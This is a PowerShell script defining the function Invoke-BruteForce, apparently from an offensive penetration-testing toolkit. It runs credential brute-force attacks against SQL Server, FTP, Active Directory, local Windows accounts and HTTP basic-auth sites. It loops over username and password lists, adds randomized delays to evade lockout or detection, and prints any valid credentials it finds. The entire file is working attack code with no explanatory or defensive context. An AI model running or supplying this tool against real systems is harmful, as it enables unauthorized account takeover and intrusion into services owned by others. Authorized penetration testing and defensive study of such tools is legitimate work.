function Invoke-BruteForce
{
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline=$true)]
        [Alias("PSComputerName","CN","MachineName","IP","IPAddress","Identity","Url","Ftp","Domain","DistinguishedName")]
        [String]
        $ComputerName,
        [Parameter(Position = 1, Mandatory = $true)]
        [Alias('Users')]
        [String]
        $UserList,
        [Parameter(Position = 2, Mandatory = $true)]
        [Alias('Passwords')]
        [String]
        $PasswordList,
        [Parameter(Position = 3, Mandatory = $true)] [ValidateSet("SQL","FTP","ActiveDirectory","LocalAccounts","Web")]
        [String]
        $Service = "SQL",
        [Parameter(Position = 4, Mandatory = $false)]
        [Switch]
        $StopOnSuccess,
        [Parameter(Position = 5, Mandatory = $false)]
        [Double]
        $Jitter = .3,
        [Parameter(Position = 6, Mandatory = $false)]
        [UInt32]
        $Delay = 0
    )
    Process
    {
        Write-Verbose "Starting Brute-Force with a Delay of $Delay and Jitter $Jitter."
        $usernames = Get-Content -ErrorAction SilentlyContinue -Path $UserList
        $passwords = Get-Content -ErrorAction SilentlyContinue -Path $PasswordList
        if (!$usernames) { 
            $usernames = $UserList
            Write-Verbose "UserList file does not exist. Using UserList as usernames:"
            Write-Verbose $usernames
        }
        if (!$passwords) {
            $passwords = $PasswordList
            Write-Verbose "PasswordList file does not exist. Using PasswordList as passwords:"
            Write-Verbose $passwords
        }
        $RandNo = New-Object System.Random
        $Connection = New-Object System.Data.SQLClient.SQLConnection
        function CheckForSQLSuccess
        {
            Try
            {
                $Connection.Open()
                $success = $true
            }
            Catch
            {
                $success = $false
            }
            if($success -eq $true)
            {
                Write-Output "Match found! $username : $Password"
                switch ($connection.ServerVersion) {
                    { $_ -match "^6" } { "SQL Server 6.5";Break UsernameLoop }
                    { $_ -match "^7" } { "SQL Server 7";Break UsernameLoop }
                    { $_ -match "^8" } { "SQL Server 2000";Break UsernameLoop }
                    { $_ -match "^9" } { "SQL Server 2005";Break UsernameLoop }
                    { $_ -match "^10\.00" } { "SQL Server 2008";Break UsernameLoop }
                    { $_ -match "^10\.50" } { "SQL Server 2008 R2";Break UsernameLoop }
                    { $_ -match "^11" } { "SQL Server 2012";Break UsernameLoop }
                    { $_ -match "^12" } { "SQL Server 2014";Break UsernameLoop }
                    { $_ -match "^13" } { "SQL Server 2016";Break UsernameLoop }
                    { $_ -match "^14" } { "SQL Server 2017";Break UsernameLoop }
                    Default { "Unknown" }
                }
            }
            $Connection.Close()
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
        }
        if($service -eq "SQL")
        {
            Write-Output "Brute Forcing SQL Service on $ComputerName"
            if($userList)
            {
                :UsernameLoop foreach ($username in $usernames)
                {
                    foreach ($Password in $Passwords)
                    {
                        $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
                        Write-Verbose "Checking $userName : $password"
                        $success = CheckForSQLSuccess
                        if ($success)
                        {
                            Write-Output "Match found! $username : $password"
                            if ($StopOnSuccess)
                            {
                                break UsernameLoop
                            }
                        }
                    }
                }
            }
            else
            {
                $Connection.ConnectionString = "server=$identity;Initial Catalog=Master;trusted_connection=true;"
                CheckForSQLSuccess
            }
        }
        elseif ($service -eq "FTP")
        {
            if($ComputerName -notMatch "^ftp://")
            {
                $source = "ftp://" + $ComputerName
            }
            else
            {
                $source = $ComputerName
            }
            Write-Output "Brute Forcing FTP on $ComputerName"
            :UsernameLoop foreach ($username in $usernames)
            {
                foreach ($Password in $Passwords)
                {
                    try
                    {
                        $ftpRequest = [System.Net.FtpWebRequest]::Create($source)
                        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
                        Write-Verbose "Checking $userName : $password"
                        $ftpRequest.Credentials = new-object System.Net.NetworkCredential($userName, $password)
                        $result = $ftpRequest.GetResponse()
                        $message = $result.BannerMessage + $result.WelcomeMessage
                        Write-Output "Match found! $username : $Password"
                        $success = $true
                        if ($StopOnSuccess)
                        {
                            break UsernameLoop
                        }
                    }
                    catch
                    {
                        $message = $error[0].ToString()
                        $success = $false
                    }
                    Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                }
            }
        }
        elseif ($service -eq "ActiveDirectory" -or $service -eq "LocalAccounts")
        {
	    if ($service -eq "ActiveDirectory")
	    {
	        Write-Output "Brute Forcing Active Directory $ComputerName"
                $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
	    }
	    else
	    {
	        Write-Output "Brute Forcing Local Accounts $ComputerName"
                $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Machine
	    }
            Add-Type -AssemblyName System.DirectoryServices.AccountManagement
            Try
            {
                $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $ComputerName)
                $success = $true
            }
            Catch
            {
                $message = "Unable to contact Domain"
                $success = $false
            }
            if($success -ne $false)
            {
                :UsernameLoop foreach ($username in $usernames)
                {
                    foreach ($password in $passwords)
                    {
                        $SleepSeconds = $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                        Try
                        {
                            Write-Verbose "Checking $username : $password (then sleeping for $SleepSeconds seconds)"
                            $success = $principalContext.ValidateCredentials($username, $password)
                            $message = "Password Match"
                            if ($success -eq $true)
                            {
                                Write-Output "Match found! $username : $password"
                                if ($StopOnSuccess)
                                {
                                    break UsernameLoop
                                }
                            }
                        }
                        Catch
                        {
                            $success = $false
                            $message = "Password doesn't match"
                        }
                        Start-Sleep -Seconds $SleepSeconds
                    }
                }
            }
            else {
            Write $message    
            }
        }
        elseif ($service -eq "Web")
        {
            if ($ComputerName -notMatch "^(http|https)://")
            {
                $source = "http://" + $ComputerName
            }
            else
            {
                $source = $ComputerName
            }
            :UsernameLoop foreach ($username in $usernames)
            {
                foreach ($Password in $Passwords)
                {
                    $webClient = New-Object Net.WebClient
                    $securePassword = ConvertTo-SecureString -AsPlainText -String $password -Force
                    $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $userName, $securePassword
                    $webClient.Credentials = $credential
                    Try
                    {
                        Write-Verbose "Checking $userName : $password"
                        $source
                        $webClient.DownloadString($source)
                        $success = $true
                        $success
                        if ($success -eq $true)
                        {
                            Write-Output "Match found! $Username : $Password"
                            if ($StopOnSuccess)
                            {
                                break UsernameLoop
                            }
                        }
                    }
                    Catch
                    {
                        $success = $false
                        $message = "Password doesn't match"
                    }
                    Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                }
            }
        }
    }
}
